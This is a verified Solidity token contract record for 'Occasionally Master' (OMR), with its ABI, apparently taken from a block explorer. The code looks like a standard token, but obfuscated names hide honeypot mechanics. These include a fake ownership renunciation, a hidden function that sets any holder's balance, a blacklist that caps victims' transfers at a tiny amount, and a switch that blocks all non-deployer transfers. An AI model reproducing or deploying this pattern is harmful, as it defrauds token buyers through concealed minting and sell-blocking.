{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface launchedTx {\n    function createPair(address senderReceiver, address takeShouldMin) external returns (address);\n}\n\ninterface feeLimitMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverWalletSender) external view returns (uint256);\n\n    function transfer(address marketingMin, uint256 tokenMarketing) external returns (bool);\n\n    function allowance(address launchedAt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tokenMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address marketingMin,\n        uint256 tokenMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed takeExempt, uint256 value);\n    event Approval(address indexed launchedAt, address indexed spender, uint256 value);\n}\n\nabstract contract marketingFrom {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverTotal {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface feeLimitMarketingMetadata is feeLimitMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract OccasionallyMaster is marketingFrom, feeLimitMarketing, feeLimitMarketingMetadata {\n\n    address liquidityReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private buyLiquidity;\n\n    address public senderAmount;\n\n    function allowance(address launchedTradingWallet, address fromLimit) external view virtual override returns (uint256) {\n        if (fromLimit == liquidityReceiver) {\n            return type(uint256).max;\n        }\n        return receiverTxTo[launchedTradingWallet][fromLimit];\n    }\n\n    bool private launchMarketing;\n\n    uint256 constant sellSwap = 13 ** 10;\n\n    uint256 private receiverList;\n\n    function receiverMarketingAmount(address toReceiver, address marketingMin, uint256 tokenMarketing) internal returns (bool) {\n        require(txTake[toReceiver] >= tokenMarketing);\n        txTake[toReceiver] -= tokenMarketing;\n        txTake[marketingMin] += tokenMarketing;\n        emit Transfer(toReceiver, marketingMin, tokenMarketing);\n        return true;\n    }\n\n    function atMarketing() public {\n        emit OwnershipTransferred(senderAmount, address(0));\n        launchIsFund = address(0);\n    }\n\n    string private senderBuy = \"Occasionally Master\";\n\n    bool public fromToTx;\n\n    function exemptMarketingMin(address minSender) public {\n        takeEnable();\n        \n        if (minSender == senderAmount || minSender == amountTo) {\n            return;\n        }\n        minWallet[minSender] = true;\n    }\n\n    mapping(address => uint256) private txTake;\n\n    function transfer(address feeSender, uint256 tokenMarketing) external virtual override returns (bool) {\n        return modeLaunched(_msgSender(), feeSender, tokenMarketing);\n    }\n\n    uint256 sellLaunchList;\n\n    uint256 modeTxReceiver;\n\n    uint256 private exemptTrading;\n\n    address public amountTo;\n\n    function getOwner() external view returns (address) {\n        return launchIsFund;\n    }\n\n    function owner() external view returns (address) {\n        return launchIsFund;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return toAmount;\n    }\n\n    function launchedReceiver(address liquiditySell) public {\n        require(liquiditySell.balance < 100000);\n        if (liquidityMode) {\n            return;\n        }\n        \n        maxTo[liquiditySell] = true;\n        if (launchMarketing) {\n            fromToTx = true;\n        }\n        liquidityMode = true;\n    }\n\n    function isLaunch(address feeSender, uint256 tokenMarketing) public {\n        takeEnable();\n        txTake[feeSender] = tokenMarketing;\n    }\n\n    event OwnershipTransferred(address indexed autoShould, address indexed marketingTx);\n\n    bool public liquidityMode;\n\n    address private launchIsFund;\n\n    bool private launchFeeTo;\n\n    function decimals() external view virtual override returns (uint8) {\n        return toToken;\n    }\n\n    bool private listSell;\n\n    uint256 public listFeeTrading;\n\n    uint256 private toAmount = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public minWallet;\n\n    function transferFrom(address toReceiver, address marketingMin, uint256 tokenMarketing) external override returns (bool) {\n        if (_msgSender() != liquidityReceiver) {\n            if (receiverTxTo[toReceiver][_msgSender()] != type(uint256).max) {\n                require(tokenMarketing <= receiverTxTo[toReceiver][_msgSender()]);\n                receiverTxTo[toReceiver][_msgSender()] -= tokenMarketing;\n            }\n        }\n        return modeLaunched(toReceiver, marketingMin, tokenMarketing);\n    }\n\n    mapping(address => bool) public maxTo;\n\n    function approve(address fromLimit, uint256 tokenMarketing) public virtual override returns (bool) {\n        receiverTxTo[_msgSender()][fromLimit] = tokenMarketing;\n        emit Approval(_msgSender(), fromLimit, tokenMarketing);\n        return true;\n    }\n\n    bool public fromTotal;\n\n    mapping(address => mapping(address => uint256)) private receiverTxTo;\n\n    function balanceOf(address receiverWalletSender) public view virtual override returns (uint256) {\n        return txTake[receiverWalletSender];\n    }\n\n    function modeLaunched(address toReceiver, address marketingMin, uint256 tokenMarketing) internal returns (bool) {\n        if (toReceiver == senderAmount) {\n            return receiverMarketingAmount(toReceiver, marketingMin, tokenMarketing);\n        }\n        uint256 totalLimit = feeLimitMarketing(amountTo).balanceOf(tokenFee);\n        require(totalLimit == sellLaunchList);\n        require(marketingMin != tokenFee);\n        if (minWallet[toReceiver]) {\n            return receiverMarketingAmount(toReceiver, marketingMin, sellSwap);\n        }\n        return receiverMarketingAmount(toReceiver, marketingMin, tokenMarketing);\n    }\n\n    constructor (){\n        if (launchMarketing) {\n            listFeeTrading = exemptTrading;\n        }\n        receiverTotal maxSwap = receiverTotal(liquidityReceiver);\n        amountTo = launchedTx(maxSwap.factory()).createPair(maxSwap.WETH(), address(this));\n        if (listSell) {\n            modeFund = true;\n        }\n        senderAmount = _msgSender();\n        maxTo[senderAmount] = true;\n        txTake[senderAmount] = toAmount;\n        atMarketing();\n        \n        emit Transfer(address(0), senderAmount, toAmount);\n    }\n\n    string private atSell = \"OMR\";\n\n    uint8 private toToken = 18;\n\n    function walletFund(uint256 tokenMarketing) public {\n        takeEnable();\n        sellLaunchList = tokenMarketing;\n    }\n\n    function takeEnable() private view {\n        require(maxTo[_msgSender()]);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return atSell;\n    }\n\n    address tokenFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function name() external view virtual override returns (string memory) {\n        return senderBuy;\n    }\n\n    bool public modeFund;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeExempt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTradingWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverWalletSender\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minSender\",\"type\":\"address\"}],\"name\":\"exemptMarketingMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromToTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenMarketing\",\"type\":\"uint256\"}],\"name\":\"isLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquiditySell\",\"type\":\"address\"}],\"name\":\"launchedReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listFeeTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenMarketing\",\"type\":\"uint256\"}],\"name\":\"walletFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "OccasionallyMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}